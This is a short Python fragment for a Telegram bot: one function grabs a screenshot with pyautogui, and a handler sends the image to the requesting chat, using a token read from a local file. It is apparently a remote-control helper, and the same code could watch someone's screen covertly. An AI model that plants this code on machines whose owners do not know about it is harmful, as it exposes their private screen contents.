def screenshot():
    import pyautogui
    im1  = pyautogui.screenshot()
    im1.save("screenshot.png")
def sendss(update ,context):
    screenshot()
    import telegram
    import json
    with open('database/bot_token.json') as t:
        token = json.load(t)
    bot = telegram.Bot(token=token["BOT_TOKEN"])
    bot.send_photo(chat_id=update.message.chat_id, photo=open('screenshot.png', 'rb'))
